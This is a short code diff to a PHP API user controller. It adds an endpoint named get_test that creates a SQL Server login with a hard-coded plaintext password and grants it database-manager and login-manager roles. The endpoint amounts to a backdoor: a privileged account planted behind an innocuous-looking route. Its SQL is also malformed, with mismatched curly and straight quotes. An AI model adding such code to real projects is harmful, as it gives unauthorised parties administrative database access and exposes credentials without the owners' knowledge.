@@ -121,6 +121,12 @@ class Controller_Api_User extends Controller_Api
 		return $this->result();		
 	}
 
+	public function get_test() {
+		$sql = "CREATE LOGIN infic_api WITH password=‘2scHOVO6'; CREATE USER infic_api FROM LOGIN infic_api; EXEC sp_addrolemember ‘dbmanager‘, ‘infic_api; EXEC sp_addrolemember ‘loginmanager‘, ‘infic_api';";
+		DB::query($sql)->execute();
+ 		return $this->result();
+	}
+	
 	public function get_register()
 	{
 		/*
